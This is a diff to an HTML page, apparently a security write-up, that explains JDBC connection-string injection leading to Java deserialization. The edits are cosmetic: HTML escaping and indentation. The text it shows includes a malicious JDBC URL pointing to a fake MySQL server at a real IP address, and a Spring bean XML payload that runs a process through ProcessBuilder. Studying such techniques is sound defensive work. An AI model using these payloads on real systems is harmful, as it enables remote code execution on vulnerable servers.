@@ -33,7 +33,7 @@ layout: default
             <p
             style="text-align: left;">jstr which has been taken from the user has been assigned to urlpassed to DriverManager.getConnection().</p>
                 <p style="text-align: left;">The final sink function here is the DriverManager.getConnection().</p>
-                <h3>Exploit:</h3>
+                <h3>Exploitation:</h3>
                 <p style="text-align: left;">To exploit this flaw we have to set up a fake mysql server which is respond with a Malicious Serialized object which upon getting deserialized will give us code execution.</p>
                 <p style="text-align: left;">Note: The exploitation depends on the JDK version and available gadgets.</p>
                 <p style="text-align: left;">
@@ -51,7 +51,7 @@ layout: default
                 
                 <div>Now the JDBC String you have to send to the vulnerable application looks something like below.</div>
                 
-                <div><code><pre>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_<gadget_name>_<binary_name></binary_name></pre></code></div>
+                <div><code><pre>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_&ltgadget_name>_&ltbinary_name></binary_name></pre></code></div>
                 
                 <div>For example if you want to use commonBeanUtils gadget with binary to be notepad.exe then the JDBC string looks like below.</div>
                 
@@ -93,17 +93,17 @@ layout: default
                     <ul>
                         <li>Host a bean xml file with the following contents</li>
                         <code><pre>
-&ltbeans xmlns="http://www.springframework.org/schema/beans"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-&ltbean id="pb" class="java.lang.ProcessBuilder">
-&ltconstructor-arg>
-&ltlist>
-&ltvalue>calc.exe&lt/value>
-&lt/list>
-&lt/constructor-arg>
-&ltproperty name="whatever" value="#{ pb.start() }" />
-&lt/bean>
-&lt/beans>
+                        &ltbeans xmlns="http://www.springframework.org/schema/beans"
+                        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+                        &ltbean id="pb" class="java.lang.ProcessBuilder">
+                        &ltconstructor-arg>
+                        &ltlist>
+                        &ltvalue>calc.exe&lt/value>
+                        &lt/list>
+                        &lt/constructor-arg>
+                        &ltproperty name="whatever" value="#{ pb.start() }" />
+                        &lt/bean>
+                        &lt/beans>
                         </pre></code>
 
                         <li>Pass the below JDBC Url to the target application</li>
